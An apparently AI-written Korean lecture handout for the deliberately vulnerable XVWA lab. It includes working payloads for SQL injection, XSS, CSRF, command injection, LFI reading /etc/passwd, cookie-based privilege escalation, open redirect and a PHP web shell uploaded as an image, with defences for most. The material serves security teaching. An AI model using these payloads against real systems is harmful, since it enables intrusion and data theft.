아래는 XVWA 실습 강의 자료 전체를 Markdown(.md) 형식으로 깔끔하게 정리한 버전입니다.
바로 GitHub README나 강의 교재로 사용 가능하도록 구성했어!

⸻

📘 XVWA 웹 취약점 실습 강의 자료

🎯 강의 목표
	•	XVWA 설치 및 실행
	•	웹 취약점의 원리와 공격 방법 이해
	•	주요 OWASP Top 10 취약점 10가지를 실습을 통해 경험
	•	개발자/보안담당자에게 필요한 기본 웹 보안 역량 확보

⸻

1. 🧱 XVWA 소개

**XVWA(Xtreme Vulnerable Web Application)**는 다양한 웹 취약점을 실습할 수 있도록 의도적으로 취약하게 만들어진 웹 애플리케이션입니다.
Docker 기반으로 빠르게 설치하여 SQL Injection, XSS, CSRF, Command Injection 등 핵심 취약점을 학습할 수 있습니다.

⸻

2. 🛠 설치 및 실행

2.1 Docker 설치

Docker Desktop 설치
https://www.docker.com/products/docker-desktop/

2.2 XVWA 실행

docker run -d -p 4000:80 s1r1us/xvwa

호스트 4000 → 컨테이너 80 매핑

2.3 접속

브라우저에서 아래 주소로 접속

http://localhost:4000


⸻

3. 📚 실습 환경 개요

XVWA가 제공하는 취약점 목록:

취약점	설명
SQL Injection	논리 조작을 통한 DB 공격
XSS	반사형/저장형 스크립트 공격
CSRF	요청 위조 공격
File Upload	악성 파일 업로드
Command Injection	서버 명령 실행
LFI/RFI	파일 포함 취약점
Broken Auth	인증/세션 취약
Redirect	Open Redirect


⸻

4. 🧪 실습 10선

아래 10개의 실습은 웹 보안 입문부터 중급까지 커버함.

⸻

🔥 실습 1. SQL Injection (기초)

🎯 목표
	•	WHERE 조건을 우회
	•	' OR 1=1 -- 공격 이해

📝 방법
	1.	XVWA → SQL Injection 메뉴
	2.	입력창에 다음 입력

' OR 1=1 --


	3.	모든 데이터 출력되는지 확인
	4.	Burp Suite로 요청 캡처하여 payload 조작 실습 가능

🔒 방어
	•	Prepared Statement
	•	입력 값 검증
	•	최소 권한 DB 계정

⸻

🔥 실습 2. SQL Injection – UNION 기반

📝 방법
	1.	입력

' UNION SELECT null,null --


	2.	컬럼 수 파악
	3.	DB 정보 추출

' UNION SELECT 1,version() --



📌 학습 포인트
	•	DB 구조 파악
	•	UNION 기반 공격 원리

⸻

🔥 실습 3. Reflected XSS

📝 방법

입력창에 다음 스크립트 삽입

"><script>alert('XSS')</script>

반사된 입력 값이 그대로 출력되면 JavaScript가 실행됨.

🔒 방어
	•	Output Encoding
	•	CSP 적용

⸻

🔥 실습 4. Stored XSS

📝 방법

게시판/댓글 입력창에 삽입

<script>alert('Stored XSS')</script>

저장 후 페이지 새로고침 → 스크립트 실행 확인

📌 학습 포인트
	•	“저장형”은 더 위험 (모든 사용자에게 영향)

⸻

🔥 실습 5. CSRF 공격

📝 방법
	1.	CSRF 페이지에서 이메일 변경 요청 확인
	2.	다음 HTML을 공격 페이지로 제작

<img src="http://localhost:4000/change?email=hacked@example.com">

	3.	피해자가 이 페이지를 보기만 해도 이메일 변경됨

🔒 방어
	•	CSRF Token
	•	Referer 검증

⸻

🔥 실습 6. 파일 업로드 – WebShell 업로드

📝 방법
	1.	XVWA → File Upload
	2.	아래 내용을 가진 PHP 파일을 이미지로 위장

<?php echo shell_exec($_GET['cmd']); ?>

파일명: shell.php.jpg
	3.	업로드 후 실행

http://localhost:4000/uploads/shell.php.jpg?cmd=whoami

📌 학습 포인트
	•	실전 RCE(Remote Command Execution) 체험
	•	파일 확장자 우회 기법

⸻

🔥 실습 7. Command Injection

📝 방법

Ping 입력창에 다음 입력

127.0.0.1; ls -al

서버 파일 목록이 출력되면 취약점 존재

🔒 방어
	•	OS 명령 호출 금지
	•	화이트리스트 기반 검증

⸻

🔥 실습 8. LFI(Local File Inclusion)

📝 방법

URL 파라미터 조작

?page=../../../../etc/passwd

서버의 민감 파일 열람 가능

📌 확장 실습
	•	PHP wrapper 이용
	•	Log Poisoning → RCE

⸻

🔥 실습 9. Broken Authentication

📝 방법
	1.	로그인 페이지 이동
	2.	Cookie 조작

document.cookie = "role=admin";

	3.	관리자 권한 페이지 접근 확인

📌 학습 포인트
	•	세션 탈취
	•	권한 상승

⸻

🔥 실습 10. Open Redirect

📝 방법

http://localhost:4000/redirect.php?url=https://evil.com

외부 악성 사이트로 리다이렉트되는지 확인

📌 학습 포인트
	•	피싱 공격에서 자주 이용

⸻

5. 📘 강의 진행 구성안

5.1 OT (10분)
	•	XVWA 소개
	•	OWASP Top 10 설명

5.2 실습 환경 구축 (10분)
	•	Docker 설치
	•	XVWA 실행 → 접속 테스트

5.3 취약점 실습 단계별 진행 (60~90분)
	1.	SQLi (기초 → 고급)
	2.	XSS (반사형/저장형)
	3.	CSRF
	4.	파일 업로드 취약점
	5.	Command Injection
	6.	LFI/RFI
	7.	Broken Auth
	8.	Redirect

5.4 정리 (10분)
	•	실습 피드백
	•	보안 코딩 가이드라인 소개

⸻

6. 📂 부록

6.1 Docker Compose 버전

version: '3'
services:
  xvwa:
    image: s1r1us/xvwa
    ports:
      - "4000:80"
    restart: always

실행:

docker-compose up -d


⸻

7. 🙋 요청 시 추가 제작 가능
	•	PPT 강의안 디자인 버전
	•	실습 체크리스트
	•	Burp Suite 확장 실습 문서
	•	공격 자동화 스크립트

⸻

필요하면 PDF, PPT, GitHub README 스타일, 교육용 요약본 등 어떤 형태든 만들 수 있어.
원하는 버전 말해줘!